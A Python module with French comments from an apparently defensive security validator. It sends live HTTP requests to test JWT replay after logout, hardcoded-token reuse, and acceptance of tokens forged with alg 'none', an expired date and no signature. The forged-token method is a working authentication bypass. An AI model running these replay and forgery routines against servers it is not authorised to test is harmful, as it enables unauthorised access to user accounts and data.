"""
active_validator/token_replayer.py
────────────────────────────────────
Test de rejouabilité des tokens JWT.
Vérifie si un token reste valide après logout ou expiration.
C'est un test ACTIF : il envoie de vraies requêtes HTTP au serveur.
"""

import httpx
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Any, Optional


class TokenReplayer:
    """
    Testeur de rejouabilité des tokens.
    Envoie de vraies requêtes HTTP pour PROUVER l'exploitabilité.
    """

    def __init__(self, base_url: str, timeout: int = 10):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout

    async def test_replay_after_logout(
        self,
        token: str,
        logout_url: str,
        protected_url: str,
    ) -> Dict[str, Any]:
        """
        SCÉNARIO : Token replay post-logout.

        Étapes :
        1. GET /protected avec le token → doit retourner 200
        2. POST /logout avec le token → logout
        3. GET /protected avec le MÊME token → si 200, vulnérabilité confirmée

        Args:
            token:         Token JWT à tester
            logout_url:    Endpoint de logout (ex: /api/logout)
            protected_url: Endpoint protégé (ex: /api/dashboard)

        Returns:
            Evidence dict avec steps, vulnerability_confirmed, proof
        """
        evidence = {
            "attack_type": "TOKEN_REPLAY_AFTER_LOGOUT",
            "vulnerability_confirmed": False,
            "steps": [],
            "proof": []
        }

        try:
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                # Étape 1 — GET protected avec token (vérifier que ça marche)
                evidence["steps"].append("Step 1: Testing token before logout...")
                before_logout_response = await client.get(
                    protected_url,
                    headers={"Authorization": f"Bearer {token}"}
                )

                evidence["steps"].append(
                    f"Before logout: {before_logout_response.status_code}"
                )

                if before_logout_response.status_code not in [200, 201]:
                    evidence["proof"].append(
                        "Token not working before logout - cannot test replay"
                    )
                    return evidence

                # Étape 2 — POST logout
                evidence["steps"].append("Step 2: Logging out...")
                logout_response = await client.post(
                    logout_url,
                    headers={"Authorization": f"Bearer {token}"}
                )

                evidence["steps"].append(f"Logout response: {logout_response.status_code}")

                # Étape 3 — GET protected avec le même token
                evidence["steps"].append("Step 3: Testing token after logout...")
                after_logout_response = await client.get(
                    protected_url,
                    headers={"Authorization": f"Bearer {token}"}
                )

                evidence["steps"].append(
                    f"After logout: {after_logout_response.status_code}"
                )

                # Si status == 200 → vulnerability_confirmed = True
                if after_logout_response.status_code in [200, 201]:
                    evidence["vulnerability_confirmed"] = True
                    evidence["proof"].append(
                        f"VULNERABILITY: Token replay successful! "
                        f"Token still works after logout (status: {after_logout_response.status_code})"
                    )
                else:
                    evidence["proof"].append(
                        f"Token properly invalidated after logout "
                        f"(status: {after_logout_response.status_code})"
                    )

                # Construire la preuve (proof string) avec les status codes
                proof_string = (
                    f"Token Replay Test Results:\n"
                    f"Before logout: {before_logout_response.status_code}\n"
                    f"Logout: {logout_response.status_code}\n"
                    f"After logout: {after_logout_response.status_code}\n"
                )

                if evidence["vulnerability_confirmed"]:
                    proof_string += "\nVULNERABILITY CONFIRMED: Token remains valid after logout"
                else:
                    proof_string += "\nSECURE: Token properly invalidated after logout"

                evidence["proof"].append(proof_string)

        except Exception as e:
            evidence["proof"].append(f"Test failed: {str(e)}")

        return evidence

    async def test_expired_token_replay(
        self,
        token: str,
        protected_url: str,
    ) -> Dict[str, Any]:
        """
        SCÉNARIO : Token expiré accepté par le serveur.

        Modifier le champ 'exp' du payload pour mettre une date passée,
        re-signer et envoyer au serveur.

        Returns:
            Evidence dict avec expired_token_accepted, severity
        """
        evidence = {
            "attack_type": "EXPIRED_TOKEN_REPLAY",
            "vulnerability_confirmed": False,
            "expired_token_accepted": False,
            "severity": "HIGH",
            "proof": []
        }

        try:
            import jwt
            import base64
            import json

            # Décoder le JWT sans vérifier
            parts = token.split('.')
            if len(parts) < 2:
                evidence["proof"].append("Invalid JWT format")
                return evidence

            try:
                # Décoder le header et le payload
                header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())

                # Modifier payload["exp"] = datetime.now() - 24h
                original_exp = payload.get('exp')
                if original_exp:
                    evidence["original_exp"] = datetime.fromtimestamp(original_exp).isoformat()

                # Mettre une expiration dans le passé (24h)
                expired_time = datetime.now() - timedelta(hours=24)
                payload['exp'] = int(expired_time.timestamp())

                evidence["modified_exp"] = expired_time.isoformat()

                # Re-encoder le token (alg:none ou avec clé vide)
                # Essayer d'abord avec alg:none
                new_header = header.copy()
                new_header['alg'] = 'none'

                # Encoder le nouveau header
                new_header_b64 = base64.urlsafe_b64encode(
                    json.dumps(new_header).encode()
                ).decode().rstrip('=')

                # Encoder le payload modifié
                new_payload_b64 = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')

                # Créer le token expiré sans signature
                expired_token = f"{new_header_b64}.{new_payload_b64}."

                # Envoyer au serveur et vérifier la réponse
                async with httpx.AsyncClient(timeout=self.timeout) as client:
                    test_response = await client.get(
                        protected_url,
                        headers={"Authorization": f"Bearer {expired_token}"}
                    )

                    evidence["server_response"] = test_response.status_code

                    if test_response.status_code in [200, 201]:
                        evidence["expired_token_accepted"] = True
                        evidence["vulnerability_confirmed"] = True
                        evidence["severity"] = "CRITICAL"
                        evidence["proof"].append(
                            f"VULNERABILITY: Server accepted expired token! "
                            f"Status: {test_response.status_code}"
                        )
                    else:
                        evidence["proof"].append(
                            f"Server properly rejected expired token. "
                            f"Status: {test_response.status_code}"
                        )

            except jwt.InvalidTokenError as e:
                evidence["proof"].append(f"JWT decoding error: {str(e)}")
            except Exception as e:
                evidence["proof"].append(f"Token modification error: {str(e)}")

        except Exception as e:
            evidence["proof"].append(f"Test failed: {str(e)}")

        return evidence

    async def test_token_from_different_source(
        self,
        static_token: str,
        protected_url: str,
    ) -> Dict[str, Any]:
        """
        SCÉNARIO : Token hardcodé dans le code SOURCE utilisé réellement.

        Tente d'utiliser un token trouvé statiquement pour accéder
        à une ressource protégée → corrélation statique + dynamique confrimée.

        Returns:
            Evidence dict avec attack_successful, correlation_proof
        """
        evidence = {
            "attack_type": "STATIC_TOKEN_CORRELATION",
            "vulnerability_confirmed": False,
            "attack_successful": False,
            "correlation_proof": [],
            "proof": []
        }

        try:
            # Utiliser static_token dans Authorization header
            evidence["steps"] = [
                "Step 1: Using token found in static analysis",
                "Step 2: Testing access to protected endpoint"
            ]

            async with httpx.AsyncClient(timeout=self.timeout) as client:
                # GET protected_url
                test_response = await client.get(
                    protected_url,
                    headers={"Authorization": f"Bearer {static_token}"}
                )

                evidence["server_response"] = test_response.status_code

                # Si 200 → corroborer la découverte statique
                if test_response.status_code in [200, 201]:
                    evidence["attack_successful"] = True
                    evidence["vulnerability_confirmed"] = True
                    evidence["correlation_proof"].append(
                        "Static analysis finding confirmed by dynamic testing"
                    )
                    evidence["proof"].append(
                        f"VULNERABILITY: Hardcoded token is functional! "
                        f"Status: {test_response.status_code}"
                    )
                    evidence["proof"].append(
                        "CRITICAL: Token found in source code provides valid authentication"
                    )
                else:
                    evidence["correlation_proof"].append(
                        "Static token not functional - may be expired or invalid"
                    )
                    evidence["proof"].append(
                        f"Server rejected hardcoded token. "
                        f"Status: {test_response.status_code}"
                    )

                # Essayer d'obtenir plus d'informations sur la réponse
                try:
                    response_body = test_response.text
                    if response_body:
                        evidence["response_body"] = response_body[:200]  # Limiter la taille
                except:
                    pass

        except Exception as e:
            evidence["proof"].append(f"Test failed: {str(e)}")

        return evidence
